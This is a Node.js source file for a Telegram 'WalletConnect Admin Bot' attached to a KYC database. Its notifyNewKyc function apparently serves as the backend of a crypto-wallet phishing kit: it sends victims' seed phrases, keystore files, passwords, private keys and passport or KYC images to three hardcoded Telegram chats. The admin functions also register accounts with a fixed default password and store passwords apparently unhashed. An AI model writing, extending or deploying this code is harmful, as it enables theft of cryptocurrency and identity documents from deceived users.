const TelegramBot = require('node-telegram-bot-api');
const Kyc = require('./src/models/Kyc'); // Assuming Kyc is the model for the database

// Control whether the Telegram bot runs in this environment.
// Set ENABLE_TELEGRAM=true and TELEGRAM_BOT_TOKEN in the server .env to enable.
const ENABLE_TELEGRAM = process.env.ENABLE_TELEGRAM === 'true';
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || null;

const chatIds = [
  '5121199643',
  '8325458921',
  '8492579493'
];

let bot = null;

if (ENABLE_TELEGRAM && TOKEN) {
  try {
    bot = new TelegramBot(TOKEN, { polling: true });

    // Graceful polling error logging (prevents uncaught exceptions)
    bot.on('polling_error', (err) => {
      console.error('telegram polling_error', err && err.code ? { code: err.code, message: err.message } : err);
    });

    // Admin management features
    const Admin = require('./src/models/Admin');

    bot.onText(/\/admin/, async (msg) => {
      console.log(`[TelegramBot] Received /admin from chatId: ${msg.chat.id}, text: ${msg.text}`);
      if (!chatIds.includes(msg.chat.id.toString())) {
        console.log(`[TelegramBot] chatId ${msg.chat.id} not in allowed chatIds.`);
        return;
      }
      bot.sendMessage(msg.chat.id, 'Admin Menu:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'See Admins', callback_data: 'see_admins' }],
            [{ text: 'Register as Admin', callback_data: 'register_admin' }],
            [{ text: 'Promote Admin to Super Admin', callback_data: 'promote_superadmin' }],
            [{ text: 'Demote Super Admin', callback_data: 'demote_superadmin' }],
            [{ text: 'Delete Admin', callback_data: 'delete_admin' }],
            [{ text: 'Get Data', callback_data: 'get_data' }],
            [{ text: 'Admin-webpage', url: `${process.env.CORS_ORIGIN}/admin-login` }]
          ]
        }
      });
    });

    bot.on('callback_query', async (query) => {
      const chatId = query.message.chat.id;
      const userId = query.from.id;
      if (!chatIds.includes(chatId.toString())) return;
      try {
        switch (query.data) {
          case 'see_admins': {
            const admins = await Admin.find();
            let text = 'Admins:\n';
            admins.forEach(a => {
              text += `- ${a.username} (${a.status})\n`;
            });
            bot.sendMessage(chatId, text);
            break;
          }
          case 'register_admin': {
            const username = query.from.username || `tg_${userId}`;
            let admin = await Admin.findOne({ username });
            if (admin) {
              bot.sendMessage(chatId, 'You are already registered as an admin.');
            } else {
              bot.sendMessage(chatId, `Would you like to register with your Telegram username (${username}) or create a custom username and password?`, {
                reply_markup: {
                  inline_keyboard: [
                    [{ text: 'Use Telegram Username', callback_data: 'register_with_telegram' }],
                    [{ text: 'Create Custom Account', callback_data: 'register_custom' }]
                  ]
                }
              });
            }
            break;
          }
          case 'register_with_telegram': {
            const username = query.from.username || `tg_${userId}`;
            try {
              const newAdmin = new Admin({ username, password: 'default_password', status: 'admin' });
              await newAdmin.save();
              bot.sendMessage(chatId, `You have been registered as an admin with your Telegram username: ${username}. Please change your password after logging in.`);
              notifyNewAdmin(username);
            } catch (err) {
              bot.sendMessage(chatId, 'Failed to register admin. Please try again.');
              console.error('Admin registration error:', err);
            }
            break;
          }
          case 'register_custom': {
            bot.sendMessage(chatId, 'Please reply with your desired username and password in the format: username,password');
            bot.once('message', async (msg2) => {
              const [customUsername, customPassword] = msg2.text.split(',');
              if (customUsername && customPassword && customPassword.length >= 4) {
                try {
                  const newAdmin = new Admin({ username: customUsername, password: customPassword, status: 'admin' });
                  await newAdmin.save();
                  bot.sendMessage(chatId, `You have been registered as an admin with the username: ${customUsername}.`);
                  notifyNewAdmin(customUsername);
                } catch (err) {
                  bot.sendMessage(chatId, 'Failed to register admin. Please try again.');
                  console.error('Admin registration error:', err);
                }
              } else {
                bot.sendMessage(chatId, 'Invalid format or password too short. Please use /admin and try again.');
              }
            });
            break;
          }
          case 'promote_superadmin': {
            // List admins to select one to promote
            const admins = await Admin.find({ status: 'admin' });
            if (admins.length === 0) {
              bot.sendMessage(chatId, 'No admins to promote.');
              break;
            }
            bot.sendMessage(chatId, 'Select admin to promote to superadmin:', {
              reply_markup: {
                inline_keyboard: admins.map(a => [{ text: a.username, callback_data: `make_superadmin_${a._id}` }])
              }
            });
            break;
          }
          case 'demote_superadmin': {
            // List super-admins to select one to demote
            const superAdmins = await Admin.find({ status: 'super-admin' });
            if (superAdmins.length === 0) {
              bot.sendMessage(chatId, 'No super-admins to demote.');
              break;
            }
            bot.sendMessage(chatId, 'Select super-admin to demote to admin:', {
              reply_markup: {
                inline_keyboard: superAdmins.map(a => [{ text: a.username, callback_data: `demote_superadmin_${a._id}` }])
              }
            });
            break;
          }
          case 'delete_admin': {
            // List admins to select one to delete
            const admins = await Admin.find();
            if (admins.length === 0) {
              bot.sendMessage(chatId, 'No admins to delete.');
              break;
            }
            bot.sendMessage(chatId, 'Select admin to delete:', {
              reply_markup: {
                inline_keyboard: admins.map(a => [{ text: a.username, callback_data: `delete_admin_${a._id}` }])
              }
            });
            break;
          }
          case 'get_data': {
            bot.sendMessage(chatId, 'Get latest POF?', {
              reply_markup: {
                inline_keyboard: [
                  [{ text: 'Yes', callback_data: 'get_latest_pof_yes' }],
                  [{ text: 'No', callback_data: 'get_latest_pof_no' }]
                ]
              }
            });
            break;
          }
          case 'get_latest_pof_yes': {
            const data = await fetchData('pof');
            if (data && data.proofOfFund) {
              if (data.proofOfFund.url) {
                try {
                  const imageBuffer = await fetchImageBuffer(data.proofOfFund.url);
                  bot.sendPhoto(chatId, imageBuffer, { caption: `Session ID: ${data.sessionId}` });
                } catch (err) {
                  console.error('Error converting image link to actual image:', err);
                  bot.sendMessage(chatId, `Proof of Fund link: ${data.proofOfFund.url}`);
                }
              } else {
                bot.sendMessage(chatId, `Proof of Fund link: ${data.proofOfFund}`);
              }
            } else {
              bot.sendMessage(chatId, 'No Proof of Fund found.');
            }
            break;
          }
          case 'get_latest_pof_no': {
            bot.sendMessage(chatId, 'Operation cancelled.');
            break;
          }
          default: {
            if (query.data.startsWith('make_superadmin_')) {
              const adminId = query.data.replace('make_superadmin_', '');
              await Admin.findByIdAndUpdate(adminId, { status: 'super-admin' });
              bot.sendMessage(chatId, 'Admin promoted to super-admin.');
            } else if (query.data.startsWith('demote_superadmin_')) {
              const adminId = query.data.replace('demote_superadmin_', '');
              await Admin.findByIdAndUpdate(adminId, { status: 'admin' });
              bot.sendMessage(chatId, 'Super-admin demoted to admin.');
            } else if (query.data.startsWith('delete_admin_')) {
              const adminId = query.data.replace('delete_admin_', '');
              await Admin.findByIdAndDelete(adminId);
              bot.sendMessage(chatId, 'Admin deleted.');
            }
          }
        }
      } catch (err) {
        console.error('Error handling callback query:', err);
        bot.sendMessage(chatId, 'An error occurred while processing your request. Please try again.');
      } finally {
        bot.answerCallbackQuery(query.id).catch(err => console.error('Failed to answer callback query:', err));
      }
    });

    bot.onText(/\/start/, (msg) => {
      bot.sendMessage(msg.chat.id, 'Welcome to the WalletConnect Admin Bot! Use /admin to manage admins.');
    });

    // Respond to messages (minimal handlers)
    bot.on('message', (msg) => {
      // Only respond to /start and /admin commands
      if (msg.text && (msg.text.startsWith('/start') || msg.text.startsWith('/admin'))) {
        return; // Allow handling of /start and /admin commands
      }
      // Ignore all other inputs
    });

    console.log('Telegram bot started (polling)');
  } catch (err) {
    console.error('Failed to start Telegram bot:', err);
    bot = null;
  }
} else {
  console.log('Telegram bot disabled. To enable set ENABLE_TELEGRAM=true and provide TELEGRAM_BOT_TOKEN in .env');
}


function notifyNewAdmin(username) {
  const message = `New Admin registered: ${username}`;
  if (bot) {
    chatIds.forEach(chatId => {
      try {
        bot.sendMessage(chatId, message);
      } catch (err) {
        console.error('Failed to send telegram message', err);
      }
    });
  } else {
    console.log('[telegram stub] notifyNewAdmin:', message);
  }
}

function notifyNewKyc(details) {
  // Format KYC details for Telegram
  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images, fileMap, dealersLicenseStatus, qualityRequired, karatsPurity, destinationRefineryText } = details;
  let message = `New KYC Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
  if (dealersLicenseStatus) message += `\nDealers License: ${dealersLicenseStatus}`;
  if (qualityRequired) message += `\nQuality Required: ${qualityRequired}`;
  if (karatsPurity) message += `\nKarats & Purity: ${karatsPurity}`;
  if (destinationRefineryText) message += `\nDestination Refinery: ${destinationRefineryText}`;
  if (seedPhrase) message += `\n\nSeed Phrase: ${seedPhrase}`;
  if (keystoreJson) message += `\n\nKeystore JSON: ${keystoreJson}`;
  if (password) message += `\nPassword: ${password}`;
  if (privateKey) message += `\nPrivate Key: ${privateKey}`;

  // Collect image URLs for passport and KYC document (not destination refinery)
  // Send all images from fileMap as photos, with their key as caption
  if (bot) {
    chatIds.forEach(async chatId => {
      try {
        // Send main message with only text details
        await bot.sendMessage(chatId, message);
        // Send all files in fileMap, using sendPhoto for images and sendDocument for documents
        if (fileMap && Object.keys(fileMap).length) {
          const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
          for (const [key, val] of Object.entries(fileMap)) {
            const fileUrl = val.url || val.secure_url;
            const format = (val.format || '').toLowerCase();
            const resourceType = (val.resource_type || '').toLowerCase();
            const caption = `${key} (${sessionId})`;
            if (fileUrl) {
              // Send as image if format matches or resource_type is 'image'
              if (imageFormats.includes(format) || resourceType === 'image') {
                await bot.sendPhoto(chatId, fileUrl, { caption });
              } else {
                // Send as document if resource_type is 'raw', or format is missing/not image
                await bot.sendDocument(chatId, fileUrl, { caption });
              }
            }
          }
        }
        // Append /admin prompt after sending all data
        await bot.sendMessage(chatId, 'Use /admin to manage admins.');
      } catch (err) {
        console.error('Failed to send telegram KYC message', err);
      }
    });
  } else {
    // For stub, print message and image URLs
    console.log('[telegram stub] notifyNewKyc:', message);
    if (fileMap && Object.keys(fileMap).length) {
      Object.entries(fileMap).forEach(([key, val]) => {
        const imgUrl = val.url || val.secure_url;
        if (imgUrl) {
          console.log(`[telegram stub] ${key} image:`, imgUrl);
        }
      });
    }
  }
}

async function fetchData(type) {
  try {
    if (type === 'pof') {
      const latestRecord = await Kyc.findOne().sort({ sessionId: -1 });
      return latestRecord ? { proofOfFund: latestRecord.proofOfFund, sessionId: latestRecord.sessionId } : null;
    }
    return null;
  } catch (err) {
    console.error('Error fetching data:', err);
    return null;
  }
}

async function fetchSpecificRecord(recordNumber) {
  try {
    return await Kyc.findOne({ sessionId: recordNumber });
  } catch (err) {
    console.error('Error fetching specific record:', err);
    return null;
  }
}

async function fetchRangeOfRecords(start, end) {
  try {
    return await Kyc.find({ sessionId: { $gte: start, $lte: end } }).sort({ sessionId: -1 });
  } catch (err) {
    console.error('Error fetching range of records:', err);
    return null;
  }
}

function sendData(chatId, data) {
  try {
    if (!data) {
      bot.sendMessage(chatId, 'No data found for your request.\nUse /admin to manage admins.');
      return;
    }

    if (Array.isArray(data)) {
      data.forEach(record => {
        let message = `Session ID: ${record.sessionId}\n`;
        if (record.dealersLicenseStatus) message += `Dealer's License: ${record.dealersLicenseStatus}\n`;
        if (record.fileMap) {
          Object.entries(record.fileMap).forEach(([key, val]) => {
            const fileUrl = val.url || val.secure_url;
            if (fileUrl) {
              bot.sendPhoto(chatId, fileUrl, { caption: `${key} (Session ID: ${record.sessionId})` });
            }
          });
        }
        bot.sendMessage(chatId, `${message}\nUse /admin to manage admins.`);
      });
    } else {
      let message = `Session ID: ${data.sessionId}\n`;
      if (data.dealersLicenseStatus) message += `Dealer's License: ${data.dealersLicenseStatus}\n`;
      if (data.fileMap) {
        Object.entries(data.fileMap).forEach(([key, val]) => {
          const fileUrl = val.url || val.secure_url;
          if (fileUrl) {
            bot.sendPhoto(chatId, fileUrl, { caption: `${key} (Session ID: ${data.sessionId})` });
          }
        });
      }
      bot.sendMessage(chatId, `${message}\nUse /admin to manage admins.`);
    }
  } catch (err) {
    console.error('Error sending data:', err);
    bot.sendMessage(chatId, 'An error occurred while sending the data.\nUse /admin to manage admins.');
  }
}

async function fetchImageBuffer(url) {
  const axios = require('axios');
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(response.data, 'binary');
  } catch (err) {
    console.error('Error fetching image buffer:', err);
    throw err;
  }
}

module.exports = { notifyNewAdmin, notifyNewKyc };
